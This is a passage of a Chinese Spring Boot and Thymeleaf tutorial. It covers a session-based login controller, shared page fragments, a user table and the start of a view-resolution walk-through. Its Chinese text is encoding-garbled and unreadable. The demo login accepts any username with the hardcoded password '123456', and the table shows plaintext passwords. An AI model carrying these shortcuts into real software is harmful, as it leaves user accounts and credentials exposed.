class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ¥ç™»å½•é¡µ</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(value = &#123;&quot;/&quot;,&quot;/login&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">loginPage</span><span class="hljs-params">()</span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/login&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">main</span><span class="hljs-params">(User user, HttpSession session, Model model)</span>&#123; <span class="hljs-comment">//RedirectAttributes</span><br><br>        <span class="hljs-keyword">if</span>(StringUtils.hasLength(user.getUserName()) &amp;&amp; <span class="hljs-string">&quot;123456&quot;</span>.equals(user.getPassword()))&#123;<br>            <span class="hljs-comment">//æŠŠç™»é™†æˆåŠŸçš„ç”¨æˆ·ä¿å­˜èµ·æ¥</span><br>            session.setAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>,user);<br>            <span class="hljs-comment">//ç™»å½•æˆåŠŸé‡å®šå‘åˆ°main.html;  é‡å®šå‘é˜²æ­¢è¡¨å•é‡å¤æäº¤</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/main.html&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;è´¦å·å¯†ç é”™è¯¯&quot;</span>);<br>            <span class="hljs-comment">//å›åˆ°ç™»å½•é¡µé¢</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>     <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å»mainé¡µé¢</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/main.html&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">mainPage</span><span class="hljs-params">(HttpSession session, Model model)</span>&#123;<br>        <br>        <span class="hljs-comment">//æœ€å¥½ç”¨æ‹¦æˆªå™¨,è¿‡æ»¤å™¨</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">loginUser</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>);<br>        <span class="hljs-keyword">if</span>(loginUser != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;main&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//sessionè¿‡æœŸï¼Œæ²¡æœ‰ç™»é™†è¿‡</span><br>        <span class="hljs-comment">//å›åˆ°ç™»å½•é¡µé¢</span><br>        model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;è¯·é‡æ–°ç™»å½•&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ¨¡å‹"><a href="#æ¨¡å‹" class="headerlink" title="æ¨¡å‹"></a>æ¨¡å‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-meta">@NoArgsConstructor</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String userName;<br>    <span class="hljs-keyword">private</span> String password;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="45ã€webå®éªŒ-æŠ½å–å…¬å…±é¡µé¢"><a href="#45ã€webå®éªŒ-æŠ½å–å…¬å…±é¡µé¢" class="headerlink" title="45ã€webå®éªŒ-æŠ½å–å…¬å…±é¡µé¢"></a>45ã€webå®éªŒ-æŠ½å–å…¬å…±é¡µé¢</h2><p><a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#template-layout">å®˜æ–¹æ–‡æ¡£ - Template Layout</a></p><ul><li>å…¬å…±é¡µé¢<code>/templates/common.html</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--æ³¨æ„è¦æ·»åŠ xmlns:thæ‰èƒ½æ·»åŠ thymeleafçš„æ ‡ç­¾--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;commonheader&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--common--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.css&quot;</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/css/style.css&#125;&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style-responsive.css&quot;</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/css/style-responsive.css&#125;&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!-- left side start--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;leftmenu&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;left-side sticky-left-side&quot;</span>&gt;</span><br>...<br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;left-side-inner&quot;</span>&gt;</span><br>...<br><br>        <span class="hljs-comment">&lt;!--sidebar nav start--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-pills nav-stacked custom-nav&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/main.html&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-home&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Dashboard<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            ...<br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;menu-list nav-active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-th-list&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Data Tables<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sub-menu-list&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/basic_table&#125;&quot;</span>&gt;</span> Basic Table<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/dynamic_table&#125;&quot;</span>&gt;</span> Advanced Table<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/responsive_table&#125;&quot;</span>&gt;</span> Responsive Table<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/editable_table&#125;&quot;</span>&gt;</span> Edit Table<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--sidebar nav end--&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-comment">&lt;!-- left side end--&gt;</span><br><br><br><span class="hljs-comment">&lt;!-- header section start--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;headermenu&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;header-section&quot;</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--toggle button start--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;toggle-btn&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-bars&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--toggle button end--&gt;</span><br>...<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-comment">&lt;!-- header section end--&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;commonscript&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Placed js at the end of the document so the pages load faster --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/jquery-1.10.2.min.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/jquery-ui-1.9.2.custom.min.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/jquery-migrate-1.2.1.min.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/bootstrap.min.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/modernizr.min.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/jquery.nicescroll.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--common scripts for all pages--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">th:src</span>=<span class="hljs-string">&quot;@&#123;/js/scripts.js&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>/templates/table/basic_table.html</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;ThemeBucket&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/png&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Basic Table<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:include</span>=<span class="hljs-string">&quot;common :: commonheader&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!--å°†common.htmlçš„ä»£ç æ®µ æ’è¿›æ¥--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sticky-header&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:replace</span>=<span class="hljs-string">&quot;common :: #leftmenu&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-comment">&lt;!-- main content start--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;main-content&quot;</span> &gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:replace</span>=<span class="hljs-string">&quot;common :: headermenu&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        ...<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- main content end--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- Placed js at the end of the document so the pages load faster --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:replace</span>=<span class="hljs-string">&quot;common :: #commonscript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#difference-between-thinsert-and-threplace-and-thinclude">Difference between <code>th:insert</code> and <code>th:replace</code> (and <code>th:include</code>)</a></p><h2 id="46ã€webå®éªŒ-éå†æ•°æ®ä¸é¡µé¢bugä¿®æ”¹"><a href="#46ã€webå®éªŒ-éå†æ•°æ®ä¸é¡µé¢bugä¿®æ”¹" class="headerlink" title="46ã€webå®éªŒ-éå†æ•°æ®ä¸é¡µé¢bugä¿®æ”¹"></a>46ã€webå®éªŒ-éå†æ•°æ®ä¸é¡µé¢bugä¿®æ”¹</h2><p>æ§åˆ¶å±‚ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/dynamic_table&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">dynamic_table</span><span class="hljs-params">(Model model)</span>&#123;<br>    <span class="hljs-comment">//è¡¨æ ¼å†…å®¹çš„éå†</span><br>    List&lt;User&gt; users = Arrays.asList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>),<br>                                     <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;lisi&quot;</span>, <span class="hljs-string">&quot;123444&quot;</span>),<br>                                     <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;haha&quot;</span>, <span class="hljs-string">&quot;aaaaa&quot;</span>),<br>                                     <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;hehe &quot;</span>, <span class="hljs-string">&quot;aaddd&quot;</span>));<br>    model.addAttribute(<span class="hljs-string">&quot;users&quot;</span>,users);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;table/dynamic_table&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¡µé¢ä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;display table table-bordered&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hidden-table-info&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>#<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>ç”¨æˆ·å<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>å¯†ç <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;gradeX&quot;</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;user,stats:$&#123;users&#125;&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;stats.count&#125;&quot;</span>&gt;</span>Trident<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;user.userName&#125;&quot;</span>&gt;</span>Internet<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> &gt;</span>[[$&#123;user.password&#125;]]<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="47ã€è§†å›¾è§£æ-ã€æºç åˆ†æã€‘-è§†å›¾è§£æå™¨ä¸è§†å›¾"><a href="#47ã€è§†å›¾è§£æ-ã€æºç åˆ†æã€‘-è§†å›¾è§£æå™¨ä¸è§†å›¾" class="headerlink" title="47ã€è§†å›¾è§£æ-ã€æºç åˆ†æã€‘-è§†å›¾è§£æå™¨ä¸è§†å›¾"></a>47ã€è§†å›¾è§£æ-ã€æºç åˆ†æã€‘-è§†å›¾è§£æå™¨ä¸è§†å›¾</h2><p><strong>è§†å›¾è§£æåŸç†æµç¨‹</strong>ï¼š</p><ol><li><p>ç›®æ ‡æ–¹æ³•å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼ˆé˜…è¯»<code>DispatcherServlet</code>æºç ï¼‰ï¼Œæ‰€æœ‰æ•°æ®éƒ½ä¼šè¢«æ”¾åœ¨ <code>ModelAndViewContainer</code> é‡Œé¢ï¼Œå…¶ä¸­åŒ…æ‹¬æ•°æ®å’Œè§†å›¾åœ°å€ã€‚</p></li><li><p>æ–¹æ³•çš„å‚æ•°æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰ç±»å‹å¯¹è±¡ï¼ˆä»è¯·æ±‚å‚æ•°ä¸­ç¡®å®šçš„ï¼‰ï¼ŒæŠŠä»–é‡æ–°æ”¾åœ¨ <code>ModelAndViewContainer</code> ã€‚</p></li><li><p>ä»»ä½•ç›®æ ‡æ–¹æ³•æ‰§è¡Œå®Œæˆä»¥åéƒ½ä¼šè¿”å›<code>ModelAndView</code>ï¼ˆæ•°æ®å’Œè§†å›¾åœ°å€ï¼‰ã€‚</p></li><li><p><code>processDispatchResult()</code>å¤„ç†æ´¾å‘ç»“æœï¼ˆé¡µé¢æ”¹å¦‚ä½•å“åº”ï¼‰</p><ul><li><p><code>render(mv, request, response);</code> è¿›è¡Œé¡µé¢æ¸²æŸ“é€»è¾‘</p><ul><li>æ ¹æ®æ–¹æ³•çš„<code>String</code>è¿”å›å€¼å¾—åˆ° <code>View</code> å¯¹è±¡ã€å®šä¹‰äº†é¡µé¢çš„æ¸²æŸ“é€»è¾‘ã€‘</li></ul><ol><li>æ‰€æœ‰çš„è§†å›¾è§£æå™¨å°è¯•æ˜¯å¦èƒ½æ ¹æ®å½“å‰è¿”å›å€¼å¾—åˆ°<code>View</code>å¯¹è±¡</li><li>å¾—åˆ°äº†  <code>redirect:/main.html --&gt; Thymeleaf new RedirectView()</code>ã€‚</li><li><code>ContentNegotiationViewResolver</code> é‡Œé¢åŒ…å«äº†ä¸‹é¢æ‰€æœ‰çš„è§†å›¾è§£æå™¨ï¼Œå†…éƒ¨è¿˜æ˜¯åˆ©ç”¨ä¸‹é¢æ‰€æœ‰è§†å›¾è§£æå™¨å¾—åˆ°è§†å›¾å¯¹è±¡ã€‚</li><li><code>view.render(mv.getModelInternal(), request, response);</code>  